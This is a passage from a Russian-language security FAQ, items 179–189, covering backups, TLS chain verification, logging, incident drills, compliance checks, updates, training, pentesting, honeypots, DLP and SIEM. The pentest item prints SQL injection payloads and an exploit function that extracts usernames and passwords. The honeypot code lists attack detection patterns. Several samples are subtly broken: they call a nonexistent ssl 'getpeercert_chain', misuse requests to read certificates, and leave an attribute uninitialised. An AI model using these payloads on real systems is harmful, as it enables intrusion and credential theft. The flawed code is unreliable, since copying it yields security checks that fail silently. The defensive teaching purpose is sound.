    smtp = smtplib.SMTP('smtp.example.com')
    smtp.send_message(msg)
    smtp.quit()
```

**6. Тестирование восстановления:**

```bash
#!/bin/bash
# test_restore.sh
# Тестирование восстановления на тестовом сервере

# 1. Восстановление базы данных
pg_restore -h test-db -U postgres -d testdb latest.backup

# 2. Проверка целостности
psql -h test-db -U postgres -d testdb -c "SELECT COUNT(*) FROM users;"

# 3. Проверка приложения
curl -f http://test-app.example.com/health || exit 1

echo "Restore test successful"
```

**7. Резервное копирование в облако:**

```python
import boto3
from botocore.client import Config

def backup_to_s3(local_file, s3_bucket, s3_key):
    s3 = boto3.client('s3', 
                     config=Config(signature_version='s3v4'))
    
    # Загрузка с multipart для больших файлов
    s3.upload_file(local_file, s3_bucket, s3_key,
                  ExtraArgs={'ServerSideEncryption': 'AES256'})
    
    # Включение versioning
    s3.put_bucket_versioning(
        Bucket=s3_bucket,
        VersioningConfiguration={'Status': 'Enabled'}
    )
```

**Правила 3-2-1:**
- **3** копии данных
- **2** разных типа носителей
- **1** копия вне площадки

---

### 180. Как настроить проверку цепочки сертификатов TLS?

**Ответ:** Настройка проверки цепочки сертификатов TLS:

**1. Настройка веб-сервера (Nginx):**

```nginx
server {
    listen 443 ssl http2;
    server_name example.com;
    
    # Сертификаты
    ssl_certificate /etc/ssl/certs/example.com.crt;
    ssl_certificate_key /etc/ssl/private/example.com.key;
    
    # Проверка цепочки (по умолчанию включена)
    ssl_verify_client on;  # Для client certificates
    
    # Настройки SSL
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
    
    # Проверка цепочки сертификатов
    ssl_trusted_certificate /etc/ssl/certs/ca-bundle.crt;
    ssl_verify_depth 3;
}
```

**2. Проверка сертификата на клиенте (Python):**

```python
import ssl
import socket
import certifi

def verify_certificate(hostname, port=443):
    context = ssl.create_default_context(cafile=certifi.where())
    
    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            cert = ssock.getpeercert()
            
            # Проверка цепочки
            chain = ssock.getpeercert_chain()
            
            # Валидация сертификата
            try:
                ssl.match_hostname(cert, hostname)
                print(f"Certificate verified for {hostname}")
                return True
            except ssl.CertificateError as e:
                print(f"Certificate verification failed: {e}")
                return False
```

**3. Проверка с помощью OpenSSL:**

```bash
# Проверка цепочки сертификатов
openssl s_client -connect example.com:443 -showcerts -verify_return_error

# Проверка с указанием CA bundle
openssl s_client -connect example.com:443 \
  -CAfile /etc/ssl/certs/ca-bundle.crt \
  -verify_return_error

# Проверка валидности сертификата
openssl verify -CAfile /etc/ssl/certs/ca-bundle.crt \
  /etc/ssl/certs/example.com.crt
```

**4. Автоматическая проверка сертификатов:**

```python
import ssl
import socket
from datetime import datetime

def check_certificate_expiry(hostname, port=443):
    context = ssl.create_default_context()
    
    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            cert = ssock.getpeercert()
            
            # Проверка срока действия
            not_after = datetime.strptime(cert['notAfter'], 
                                         '%b %d %H:%M:%S %Y %Z')
            days_until_expiry = (not_after - datetime.now()).days
            
            if days_until_expiry < 30:
                send_alert(f"Certificate for {hostname} expires in {days_until_expiry} days")
            
            return days_until_expiry
```

**5. Мониторинг сертификатов:**

```python
import requests
from datetime import datetime

def monitor_certificates():
    hosts = ['example.com', 'api.example.com']
    
    for host in hosts:
        try:
            response = requests.get(f'https://{host}', verify=True, timeout=5)
            cert = response.connection.sock.getpeercert()
            
            # Проверка срока действия
            not_after = datetime.strptime(cert['notAfter'],
                                         '%b %d %H:%M:%S %Y %Z')
            days_left = (not_after - datetime.now()).days
            
            if days_left < 30:
                alert(f"Certificate for {host} expires in {days_left} days")
                
        except requests.exceptions.SSLError as e:
            alert(f"SSL error for {host}: {e}")
```

**6. Настройка автоматического обновления (Let's Encrypt):**

```bash
# Certbot для автоматического обновления
certbot --nginx -d example.com --non-interactive --agree-tos \
  --email admin@example.com

# Автоматическое обновление через cron
0 0 1 * * certbot renew --quiet --post-hook "systemctl reload nginx"
```

**7. Проверка цепочки в Kubernetes:**

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: tls-secret
type: kubernetes.io/tls
data:
  tls.crt: <base64 encoded cert chain>
  tls.key: <base64 encoded key>

---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: secure-ingress
spec:
  tls:
    - hosts:
        - example.com
      secretName: tls-secret
  rules:
    - host: example.com
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: web-service
                port:
                  number: 80
```

**Критерии правильной настройки:**
- Полная цепочка сертификатов представлена
- Корневой CA в trusted store
- Проверка отзыва сертификатов (OCSP/CRL)
- Мониторинг срока действия

---

### 181. Как настроить регистрацию событий доступа (access logging)?

**Ответ:** Настройка регистрации событий доступа (access logging):

**1. Nginx access logging:**

```nginx
http {
    # Формат логов
    log_format detailed '$remote_addr - $remote_user [$time_local] '
                       '"$request" $status $body_bytes_sent '
                       '"$http_referer" "$http_user_agent" '
                       '$request_time $upstream_response_time';
    
    # Логирование доступа
    access_log /var/log/nginx/access.log detailed;
    
    # Отдельное логирование для security событий
    map $status $log_security {
        ~^[45]  1;  # 4xx, 5xx - логируем как security events
        default 0;
    }
    
    access_log /var/log/nginx/security.log detailed if=$log_security;
}
```

**2. Apache access logging:**

```apache
# httpd.conf
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %D" combined

# Логирование доступа
CustomLog /var/log/apache2/access.log combined

# Логирование ошибок
ErrorLog /var/log/apache2/error.log
LogLevel warn
```

**3. Логирование в приложении (Python Flask):**

```python
import logging
from flask import Flask, request
from logging.handlers import RotatingFileHandler

app = Flask(__name__)

# Настройка логирования
handler = RotatingFileHandler(
    'access.log',
    maxBytes=10000000,
    backupCount=5
)
handler.setFormatter(logging.Formatter(
    '%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]'
))
app.logger.addHandler(handler)
app.logger.setLevel(logging.INFO)

@app.before_request
def log_request():
    app.logger.info(
        f"{request.remote_addr} - {request.method} {request.path} - "
        f"User: {request.remote_user or 'anonymous'}"
    )

@app.after_request
def log_response(response):
    app.logger.info(
        f"Response: {response.status_code} - "
        f"Size: {response.content_length} bytes"
    )
    return response
```

**4. Централизованное логирование (syslog):**

```python
import logging
import logging.handlers

# Настройка syslog handler
syslog_handler = logging.handlers.SysLogHandler(address='/dev/log')
syslog_handler.setFormatter(logging.Formatter(
    '%(name)s: %(levelname)s %(message)s'
))

logger = logging.getLogger('app')
logger.addHandler(syslog_handler)
logger.setLevel(logging.INFO)
```

**5. Логирование в базу данных:**

```python
import logging
import sqlite3
from datetime import datetime

class DatabaseHandler(logging.Handler):
    def __init__(self, db_path):
        super().__init__()
        self.db_path = db_path
        self._init_db()
    
    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        conn.execute('''
            CREATE TABLE IF NOT EXISTS access_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                remote_addr TEXT,
                method TEXT,
                path TEXT,
                status_code INTEGER,
                user_agent TEXT
            )
        ''')
        conn.commit()
        conn.close()
    
    def emit(self, record):
        conn = sqlite3.connect(self.db_path)
        conn.execute('''
            INSERT INTO access_logs 
            (timestamp, remote_addr, method, path, status_code, user_agent)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            datetime.now().isoformat(),
            record.remote_addr,
            record.method,
            record.path,
            record.status_code,
            record.user_agent
        ))
        conn.commit()
        conn.close()
```

**6. Структурированное логирование (JSON):**

```python
import json
import logging

class JSONFormatter(logging.Formatter):
    def format(self, record):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'level': record.levelname,
            'message': record.getMessage(),
            'module': record.module,
            'function': record.funcName,
            'line': record.lineno
        }
        return json.dumps(log_entry)

handler = logging.StreamHandler()
handler.setFormatter(JSONFormatter())
logger = logging.getLogger('app')
logger.addHandler(handler)
```

**7. Логирование безопасности:**

```python
class SecurityLogger:
    def log_authentication(self, username, success, ip_address):
        event = {
            'event_type': 'authentication',
            'username': username,
            'success': success,
            'ip_address': ip_address,
            'timestamp': datetime.now().isoformat()
        }
        self._log_security_event(event)
    
    def log_access_denied(self, resource, user, reason):
        event = {
            'event_type': 'access_denied',
            'resource': resource,
            'user': user,
            'reason': reason,
            'timestamp': datetime.now().isoformat()
        }
        self._log_security_event(event)
```

**8. Ротация логов:**

```bash
# logrotate configuration
/var/log/nginx/access.log {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
    create 0640 www-data adm
    sharedscripts
    postrotate
        systemctl reload nginx > /dev/null 2>&1 || true
    endscript
}
```

**Требования к логированию:**
- Все события доступа должны логироваться
- Логи должны быть защищены от изменения
- Хранение логов согласно требованиям (GDPR, ФЗ-152)
- Централизованный сбор логов
- Мониторинг и алерты

---

### 182. Как провести учения по реагированию на инциденты?

**Ответ:** Проведение учений по реагированию на инциденты (IR Drills):

**1. Планирование учений:**

```markdown
# План учений IR
## Цели:
- Проверка процедур реагирования
- Обучение команды
- Выявление недостатков

## Сценарии:
1. SQL Injection атака
2. Ransomware инцидент
3. DDoS атака
4. Утечка данных
5. Компрометация учётных записей
```

**2. Сценарий учений:**

```python
class IncidentDrill:
    def __init__(self, scenario):
        self.scenario = scenario
        self.timeline = []
        self.participants = []
    
    def simulate_incident(self):
        # Симуляция инцидента
        incident = self.create_fake_incident()
        
        # Уведомление команды
        self.notify_team(incident)
        
        # Отслеживание действий команды
        self.monitor_response()
        
        # Оценка эффективности
        self.evaluate_response()
    
    def create_fake_incident(self):
        return {
            'type': 'sql_injection',
            'severity': 'high',
            'detected_at': datetime.now(),
            'affected_systems': ['web-server-01'],
            'indicators': ['Suspicious SQL queries in logs']
        }
```

**3. Проведение учений:**

**Этапы:**
1. **Подготовка:** Информирование участников, подготовка сценария
2. **Симуляция:** Создание инцидента, уведомление команды
3. **Реагирование:** Команда выполняет процедуры IR
4. **Наблюдение:** Отслеживание действий и времени
5. **Анализ:** Разбор действий, выявление недостатков

**4. Оценка результатов:**

```python
class DrillEvaluation:
    def evaluate(self, drill):
        metrics = {
            'time_to_detect': self.calculate_detection_time(drill),
            'time_to_contain': self.calculate_containment_time(drill),
            'time_to_resolve': self.calculate_resolution_time(drill),
            'communication_quality': self.evaluate_communication(drill),
            'procedure_compliance': self.check_procedures(drill)
        }
        
        return {
            'score': self.calculate_score(metrics),
            'recommendations': self.generate_recommendations(metrics)
        }
```

**5. После учений:**

- **Разбор:** Обсуждение действий команды
- **Отчёт:** Документирование результатов
- **Улучшения:** Обновление процедур IR
- **Повтор:** Планирование следующих учений

**Рекомендации:**
- Регулярность: минимум раз в квартал
- Реалистичность сценариев
- Постепенное усложнение
- Включение всех членов IR команды

---

### 183. Как проверить соответствие системы базовым нормам безопасности?

**Ответ:** Проверка соответствия базовым нормам безопасности:

**1. Базовые проверки (CIS Benchmarks):**

```bash
#!/bin/bash
# security_audit.sh

# Проверка обновлений безопасности
echo "Checking for security updates..."
apt list --upgradable | grep -i security

# Проверка открытых портов
echo "Checking open ports..."
netstat -tuln | grep LISTEN

# Проверка настроек firewall
echo "Checking firewall rules..."
iptables -L -n -v

# Проверка парольной политики
echo "Checking password policy..."
grep -E "^PASS_MAX_DAYS|^PASS_MIN_DAYS|^PASS_MIN_LEN" /etc/login.defs

# Проверка неактивных учётных записей
echo "Checking inactive accounts..."
lastlog | grep "**Never logged in**"
```

**2. Автоматизированная проверка (Lynis):**

```bash
# Установка Lynis
apt-get install lynis

# Запуск аудита
lynis audit system

# Проверка конкретных категорий
lynis audit system --tests-category "authentication"
```

**3. Проверка соответствия стандартам:**

```python
import subprocess
import json

class SecurityComplianceCheck:
    def check_cis_benchmark(self):
        checks = {
            'password_policy': self.check_password_policy(),
            'user_permissions': self.check_user_permissions(),
            'network_config': self.check_network_config(),
            'logging': self.check_logging(),
            'encryption': self.check_encryption()
        }
        
        return {
            'compliant': all(checks.values()),
            'details': checks
        }
    
    def check_password_policy(self):
        # Проверка минимальной длины пароля
        result = subprocess.run(
            ['grep', 'PASS_MIN_LEN', '/etc/login.defs'],
            capture_output=True, text=True
        )
        min_len = int(result.stdout.split()[1])
        return min_len >= 12
```

**4. Использование OpenSCAP:**

```bash
# Сканирование с использованием SCAP
oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_common \
  --results scan-results.xml \
  /usr/share/xml/scap/ssg/content/ssg-ubuntu2004-xccdf.xml

# Генерация отчёта
oscap xccdf generate report scan-results.xml > report.html
```

**5. Проверка конфигурации приложений:**

```python
def check_app_security_config():
    checks = {
        'https_enabled': check_https(),
        'security_headers': check_security_headers(),
        'authentication': check_authentication(),
        'authorization': check_authorization(),
        'input_validation': check_input_validation()
    }
    return checks

def check_https():
    response = requests.get('https://example.com', verify=True)
    return response.status_code == 200 and response.url.startswith('https')
```

**6. Генерация отчёта о соответствии:**

```python
def generate_compliance_report():
    report = {
        'timestamp': datetime.now().isoformat(),
        'system': get_system_info(),
        'checks': {
            'cis_benchmark': check_cis_benchmark(),
            'owasp_top10': check_owasp_compliance(),
            'pci_dss': check_pci_dss(),
            'gdpr': check_gdpr_compliance()
        },
        'recommendations': generate_recommendations()
    }
    
    return json.dumps(report, indent=2)
```

---

### 184. Как настроить автоматическое обновление системы безопасности?

**Ответ:** Настройка автоматического обновления системы безопасности:

**1. Ubuntu/Debian (unattended-upgrades):**

```bash
# Установка
apt-get install unattended-upgrades apt-listchanges

# Настройка
cat > /etc/apt/apt.conf.d/50unattended-upgrades <<EOF
Unattended-Upgrade::Allowed-Origins {
    "${distro_id}:${distro_codename}-security";
    "${distro_id}ESMApps:${distro_codename}-apps-security";
    "${distro_id}ESM:${distro_codename}-infra-security";
};
Unattended-Upgrade::AutoFixInterruptedDpkg "true";
Unattended-Upgrade::MinimalSteps "true";
Unattended-Upgrade::Remove-Unused-Kernel-Packages "true";
Unattended-Upgrade::Remove-Unused-Dependencies "true";
Unattended-Upgrade::Automatic-Reboot "false";
Unattended-Upgrade::Automatic-Reboot-Time "02:00";
EOF

# Включение автоматических обновлений
echo 'APT::Periodic::Update-Package-Lists "1";' > /etc/apt/apt.conf.d/20auto-upgrades
echo 'APT::Periodic::Unattended-Upgrade "1";' >> /etc/apt/apt.conf.d/20auto-upgrades
```

**2. Red Hat/CentOS (yum-cron):**

```bash
# Установка
yum install yum-cron

# Настройка
cat > /etc/yum/yum-cron.conf <<EOF
[commands]
update_cmd = security
download_updates = yes
apply_updates = yes
random_sleep = 360

[emitters]
emit_via = email

[email]
email_from = root@example.com
email_to = admin@example.com
email_host = smtp.example.com
EOF

# Включение службы
systemctl enable yum-cron
systemctl start yum-cron
```

**3. Автоматическое обновление через cron:**

```bash
#!/bin/bash
# auto_update.sh

# Обновление системы
apt-get update
apt-get upgrade -y --only-upgrade security

# Перезагрузка при необходимости
if [ -f /var/run/reboot-required ]; then
    echo "Reboot required" | mail -s "System reboot needed" admin@example.com
    # Автоматическая перезагрузка (опционально)
    # shutdown -r +30 "Reboot for security updates"
fi

# Cron job (ежедневно в 2:00)
# 0 2 * * * /usr/local/bin/auto_update.sh >> /var/log/auto_update.log 2>&1
```

**4. Автоматическое обновление в Kubernetes:**

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: security-updater
spec:
  selector:
    matchLabels:
      name: security-updater
  template:
    metadata:
      labels:
        name: security-updater
    spec:
      containers:
      - name: updater
        image: alpine:latest
        command:
        - /bin/sh
        - -c
        - |
          apk update
          apk upgrade
        securityContext:
          privileged: true
      hostNetwork: true
      hostPID: true
```

**5. Мониторинг обновлений:**

```python
import subprocess
import smtplib
from email.mime.text import MIMEText

def check_security_updates():
    result = subprocess.run(
        ['apt-listchanges', '--print', '--upgrade-only'],
        capture_output=True,
        text=True
    )
    
    if result.returncode == 0 and result.stdout:
        send_notification("Security updates available", result.stdout)

def send_notification(subject, body):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = 'updates@example.com'
    msg['To'] = 'admin@example.com'
    
    smtp = smtplib.SMTP('smtp.example.com')
    smtp.send_message(msg)
    smtp.quit()
```

**6. Тестирование обновлений:**

```bash
#!/bin/bash
# test_updates.sh

# Создание тестового окружения
vagrant up test-vm

# Применение обновлений на тестовой машине
vagrant ssh test-vm -c "sudo apt-get update && sudo apt-get upgrade -y"

# Запуск тестов
vagrant ssh test-vm -c "cd /app && npm test"

# Если тесты прошли, применяем на production
if [ $? -eq 0 ]; then
    echo "Updates tested successfully"
else
    echo "Tests failed, not applying updates"
fi
```

**Рекомендации:**
- Тестирование обновлений перед применением
- Автоматическая перезагрузка только при критических обновлениях
- Мониторинг и уведомления
- Резервное копирование перед обновлениями

---

### 185. Как провести обучение сотрудников по ИБ и зафиксировать его прохождение?

**Ответ:** Проведение обучения по информационной безопасности:

**1. Платформа обучения (LMS):**

```python
class SecurityTrainingPlatform:
    def __init__(self):
        self.courses = []
        self.employees = []
        self.completions = []
    
    def create_course(self, title, content, duration):
        course = {
            'id': generate_uuid(),
            'title': title,
            'content': content,
            'duration_minutes': duration,
            'created_at': datetime.now()
        }
        self.courses.append(course)
        return course
    
    def enroll_employee(self, employee_id, course_id):
        enrollment = {
            'employee_id': employee_id,
            'course_id': course_id,
            'enrolled_at': datetime.now(),
            'status': 'in_progress'
        }
        self.enrollments.append(enrollment)
    
    def complete_course(self, employee_id, course_id, score):
        completion = {
            'employee_id': employee_id,
            'course_id': course_id,
            'completed_at': datetime.now(),
            'score': score,
            'certificate_issued': True
        }
        self.completions.append(completion)
```

**2. Система уведомлений:**

```python
def send_training_reminder(employee):
    reminder = {
        'to': employee.email,
        'subject': 'Security Training Reminder',
        'body': f'''
        Dear {employee.name},
        
        You have pending security training courses:
        - Basic Security Awareness (Due: {due_date})
        - Phishing Awareness (Due: {due_date})
        
        Please complete them at: https://training.example.com
        '''
    }
    send_email(reminder)
```

**3. Отслеживание прогресса:**

```sql
CREATE TABLE training_completions (
    id SERIAL PRIMARY KEY,
    employee_id INTEGER,
    course_id INTEGER,
    completed_at TIMESTAMP,
    score DECIMAL(5,2),
    certificate_number VARCHAR(100),
    FOREIGN KEY (employee_id) REFERENCES employees(id),
    FOREIGN KEY (course_id) REFERENCES courses(id)
);

-- Отчёт по завершению обучения
SELECT 
    e.name,
    c.title,
    tc.completed_at,
    tc.score
FROM training_completions tc
JOIN employees e ON tc.employee_id = e.id
JOIN courses c ON tc.course_id = c.id
WHERE tc.completed_at >= NOW() - INTERVAL '1 year';
```

**4. Автоматическая сертификация:**

```python
def issue_certificate(employee_id, course_id):
    completion = get_completion(employee_id, course_id)
    
    if completion.score >= 80:  # Минимальный проходной балл
        certificate = {
            'employee_id': employee_id,
            'course_id': course_id,
            'certificate_number': generate_certificate_number(),
            'issued_at': datetime.now(),
            'expires_at': datetime.now() + timedelta(days=365)
        }
        
        save_certificate(certificate)
        send_certificate_email(employee_id, certificate)
        
        return certificate
    else:
        notify_retake_required(employee_id, course_id)
```

**5. Регулярные проверки знаний:**

```python
def schedule_annual_training():
    employees = get_all_employees()
    
    for employee in employees:
        # Проверка последнего обучения
        last_training = get_last_training_date(employee.id)
        
        if last_training < datetime.now() - timedelta(days=365):
            # Назначение обязательного обучения
            assign_mandatory_training(employee.id, 'annual_refresher')
            send_training_assignment(employee)
```

**6. Отчётность:**

```python
def generate_compliance_report():
    report = {
        'total_employees': count_employees(),
        'trained_this_year': count_trained_in_period(days=365),
        'compliance_rate': calculate_compliance_rate(),
        'overdue_trainings': get_overdue_trainings(),
        'upcoming_expirations': get_upcoming_expirations(days=30)
    }
    
    return report
```

**Требования:**
- Регулярность обучения (минимум раз в год)
- Фиксация прохождения в системе
- Выдача сертификатов
- Отслеживание сроков действия
- Обязательность для всех сотрудников

---

### 186. Как провести пентест (имитацию внешней атаки)?

**Ответ:** Проведение пентеста (penetration testing):

**1. Планирование:**

```markdown
# План пентеста
## Область тестирования:
- Веб-приложение: example.com
- API: api.example.com
- Инфраструктура: 10.0.0.0/24

## Методология:
- OWASP Testing Guide
- PTES (Penetration Testing Execution Standard)
- NIST SP 800-115

## Инструменты:
- Nmap (network scanning)
- Burp Suite (web application)
- Metasploit (exploitation)
```

**2. Разведка (Reconnaissance):**

```bash
# Пассивная разведка
# Whois lookup
whois example.com

# DNS enumeration
dig example.com ANY
nslookup example.com

# Активная разведка
# Port scanning
nmap -sS -O -p- target.example.com

# Service enumeration
nmap -sV -sC target.example.com

# Web application scanning
dirb http://example.com /usr/share/wordlists/dirb/common.txt
```

**3. Тестирование веб-приложения:**

```python
# Использование Burp Suite через API
import requests
from burp import IBurpExtender

class BurpScanner(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Custom Scanner")
        
        # Сканирование на SQL Injection
        self.scan_for_sql_injection()
        
        # Сканирование на XSS
        self.scan_for_xss()
    
    def scan_for_sql_injection(self):
        payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "admin'--"
        ]
        
        for payload in payloads:
            # Отправка запросов с payloads
            self.send_test_request(payload)
```

**4. Эксплуатация уязвимостей:**

```python
# Пример эксплуатации SQL Injection
import requests

def exploit_sql_injection(url, parameter):
    payload = "1' UNION SELECT username, password FROM users--"
    
    response = requests.get(url, params={parameter: payload})
    
    if "error" not in response.text.lower():
        # Возможно успешная эксплуатация
        return parse_results(response.text)
    
    return None
```

**5. Отчёт о пентесте:**

```python
class PenetrationTestReport:
    def generate_report(self, findings):
        report = {
            'executive_summary': self.generate_executive_summary(findings),
            'methodology': self.get_methodology(),
            'findings': self.format_findings(findings),
            'risk_assessment': self.assess_risks(findings),
            'recommendations': self.generate_recommendations(findings)
        }
        
        return report
    
    def format_findings(self, findings):
        formatted = []
        for finding in findings:
            formatted.append({
                'title': finding.title,
                'severity': finding.severity,
                'cvss_score': finding.cvss_score,
                'description': finding.description,
                'evidence': finding.evidence,
                'recommendation': finding.recommendation
            })
        return formatted
```

**6. Инструменты для пентеста:**

- **Nmap** — сканирование сети
- **Burp Suite** — тестирование веб-приложений
- **Metasploit** — фреймворк эксплуатации
- **OWASP ZAP** — автоматизированное тестирование
- **Nessus** — сканирование уязвимостей

**Этические соображения:**
- Получение письменного разрешения
- Ограничение области тестирования
- Минимизация воздействия на production
- Конфиденциальность результатов

---

### 187. Как настроить и мониторить honeypot?

**Ответ:** Настройка и мониторинг **honeypot** (приманка для атак):

**1. Настройка простого honeypot (Cowrie):**

```bash
# Установка Cowrie (SSH/Telnet honeypot)
git clone https://github.com/cowrie/cowrie
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt

# Конфигурация
cp etc/cowrie.cfg.dist etc/cowrie.cfg
# Редактирование конфигурации
nano etc/cowrie.cfg

# Запуск
bin/cowrie start
```

**2. Настройка веб-приложения honeypot:**

```python
from flask import Flask, request, render_template_string
import logging

app = Flask(__name__)

# Логирование всех запросов
logging.basicConfig(filename='honeypot.log', level=logging.INFO)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    # Логирование подозрительных запросов
    log_suspicious_request(request)
    return render_template_string('<h1>404 Not Found</h1>')

def log_suspicious_request(request):
    suspicious_patterns = [
        'admin', 'phpmyadmin', 'wp-admin', 'sql',
        '../', '..\\', 'union select', '<script>'
    ]
    
    for pattern in suspicious_patterns:
        if pattern in request.path.lower() or pattern in str(request.args):
            logging.warning(
                f"Suspicious request from {request.remote_addr}: "
                f"{request.method} {request.path} - "
                f"User-Agent: {request.headers.get('User-Agent')}"
            )
            send_alert(f"Suspicious activity detected: {request.remote_addr}")
            break

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

**3. Настройка network honeypot (Honeyd):**

```bash
# Установка Honeyd
apt-get install honeyd

# Конфигурация
cat > /etc/honeyd/honeyd.conf <<EOF
create template
set template personality "Linux 2.6.31"
set template default tcp action reset
set template default udp action reset

add template tcp port 22 "sh /usr/share/honeyd/scripts/linux.sh"
add template tcp port 80 "sh /usr/share/honeyd/scripts/web.sh"

bind 10.0.0.100 template
EOF

# Запуск
honeyd -d -f /etc/honeyd/honeyd.conf
```

**4. Мониторинг honeypot:**

```python
import json
from datetime import datetime
import smtplib

class HoneypotMonitor:
    def __init__(self, log_file):
        self.log_file = log_file
        self.alert_threshold = 5  # Количество событий для алерта
    
    def monitor_logs(self):
        with open(self.log_file, 'r') as f:
            # Чтение последних строк
            lines = f.readlines()[-100:]
            
            # Анализ событий
            for line in lines:
                event = json.loads(line)
                self.analyze_event(event)
    
    def analyze_event(self, event):
        # Подсчёт событий от одного IP
        ip = event.get('src_ip')
        count = self.count_events_from_ip(ip, minutes=5)
        
        if count > self.alert_threshold:
            self.send_alert(
                f"High activity from {ip}: {count} events in 5 minutes"
            )
    
    def send_alert(self, message):
        # Отправка алерта
        print(f"ALERT: {message}")
        # send_email('security@example.com', 'Honeypot Alert', message)
```

**5. Интеграция с SIEM:**

```python
def send_to_siem(event):
    siem_client.send_event({
        'event_type': 'honeypot_interaction',
        'source_ip': event['src_ip'],
        'destination_port': event['dst_port'],
        'timestamp': event['timestamp'],
        'severity': 'medium'
    })
```

**6. Дашборд мониторинга:**

```python
from flask import Flask, render_template, jsonify

app = Flask(__name__)

@app.route('/dashboard')
def dashboard():
    # Статистика по honeypot
    stats = {
        'total_events': count_total_events(),
        'unique_ips': count_unique_ips(),
        'top_attackers': get_top_attackers(limit=10),
        'recent_events': get_recent_events(limit=20)
    }
    return render_template('dashboard.html', stats=stats)

@app.route('/api/events')
def api_events():
    events = get_recent_events(limit=100)
    return jsonify(events)
```

**Рекомендации:**
- Изоляция honeypot от production сети
- Регулярный мониторинг логов
- Автоматические алерты при подозрительной активности
- Интеграция с SIEM для корреляции событий

---

### 188. Как настроить DLP-систему (предотвращение утечек данных)?

**Ответ:** Настройка **DLP (Data Loss Prevention)** системы:

**1. Классификация данных:**

```python
class DataClassifier:
    def classify_document(self, content):
        classifications = []
        
        # Поиск персональных данных
        if self.contains_pii(content):
            classifications.append('PII')
        
        # Поиск финансовых данных
        if self.contains_credit_card(content):
            classifications.append('FINANCIAL')
        
        # Поиск коммерческой тайны
        if self.contains_trade_secret(content):
            classifications.append('CONFIDENTIAL')
        
        return classifications
    
    def contains_pii(self, content):
        import re
        # Поиск email
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        if re.search(email_pattern, content):
            return True
        
        # Поиск телефонных номеров
        phone_pattern = r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b'
        if re.search(phone_pattern, content):
            return True
        
        return False
```

**2. Мониторинг передачи данных:**

```python
class DLPMonitor:
    def monitor_email(self, email):
        # Проверка вложений
        for attachment in email.attachments:
            if self.contains_sensitive_data(attachment.content):
                self.block_email(email)
                self.alert_security_team(email)
    
    def monitor_file_transfer(self, file_path, destination):
        content = read_file(file_path)
        
        if self.contains_sensitive_data(content):
            # Блокировка передачи
            self.block_transfer(file_path, destination)
            self.log_violation(
                file_path=file_path,
                destination=destination,
                user=get_current_user()
            )
```

**3. Блокировка утечек:**

```python
class DLPEnforcer:
    def check_upload(self, file_content, user):
        classification = self.classifier.classify(file_content)
        
        if 'CONFIDENTIAL' in classification:
            if not self.has_permission(user, 'upload_confidential'):
                raise DLPViolation("Unauthorized upload of confidential data")
        
        return True
    
    def check_email(self, email_body, attachments, user):
        # Проверка содержимого
        if self.contains_sensitive_data(email_body):
            self.quarantine_email(email)
            return False
        
        # Проверка вложений
        for attachment in attachments:
            if self.contains_sensitive_data(attachment):
                self.quarantine_email(email)
                return False
        
        return True
```

**4. Маскирование данных:**

```python
def mask_sensitive_data(text):
    import re
    
    # Маскирование email
    text = re.sub(
        r'\b([A-Za-z0-9._%+-]+)@([A-Za-z0-9.-]+\.[A-Z|a-z]{2,})\b',
        r'***@\2',
        text
    )
    
    # Маскирование кредитных карт
    text = re.sub(
        r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?(\d{4})\b',
        r'****-****-****-\1',
        text
    )
    
    return text
```

**5. Мониторинг принтеров и USB:**

```python
class DeviceMonitor:
    def monitor_usb_access(self, device_path, user):
        # Блокировка USB устройств для пользователей без прав
        if not self.has_permission(user, 'usb_access'):
            self.block_usb_device(device_path)
            self.alert_security_team(user, 'usb_blocked')
    
    def monitor_printing(self, document, user):
        # Логирование печати конфиденциальных документов
        if self.contains_sensitive_data(document):
            self.log_print_event(
                user=user,
                document=document,
                timestamp=datetime.now()
            )
```

**6. Интеграция с SIEM:**

```python
def send_dlp_event_to_siem(event):
    siem.send_event({
        'event_type': 'dlp_violation',
        'user': event['user'],
        'data_classification': event['classification'],
        'action': event['action'],  # blocked, logged, alerted
        'timestamp': event['timestamp']
    })
```

---

### 189. Как настроить SIEM для сбора и анализа журналов?

**Ответ:** Настройка **SIEM (Security Information and Event Management)**:

**1. Настройка сбора логов (ELK Stack):**

```yaml
# Filebeat configuration
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/apache2/access.log
    - /var/log/apache2/error.log
  fields:
    log_type: apache
    
- type: log
  enabled: true
  paths:
    - /var/log/auth.log
  fields:
    log_type: auth

output.elasticsearch:
  hosts: ["elasticsearch:9200"]
  index: "security-logs-%{+yyyy.MM.dd}"
```

**2. Правила корреляции (Splunk):**

```python
# Splunk SPL query
search index=security_logs
| eval risk_score=case(
    status>=400, 5,
    user_agent="*bot*", 3,
    status>=500, 8,
    1=1, 1
)
| where risk_score >= 5
| stats count by src_ip, risk_score
| sort -risk_score
```

